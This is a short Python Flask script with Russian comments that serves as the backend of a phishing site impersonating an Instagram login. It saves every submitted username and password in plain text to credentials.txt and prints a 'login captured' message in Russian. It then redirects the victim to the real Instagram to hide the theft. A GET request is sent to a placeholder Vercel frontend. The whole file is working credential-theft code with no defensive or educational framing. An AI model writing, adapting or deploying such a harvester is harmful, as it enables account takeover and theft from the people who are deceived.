import os
from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username and password:
            log_entry = f"[{datetime.datetime.now()}] Username: {username} | Password: {password}\n"
            try:
                with open('credentials.txt', 'a', encoding='utf-8') as f:
                    f.write(log_entry)
                print(f"✅ ЛОГИН ЗАХВАЧЕН: {username} / {password}")
            except Exception as e:
                print(f"❌ ОШИБКА ЗАПИСИ: {e}")
        
        # Редирект на настоящий Instagram
        return redirect("https://www.instagram.com", code=302)
    
    # Если GET — просто редирект на фронтенд (Vercel)
    return redirect("https://твой-фронтенд-на-vercel.com", code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
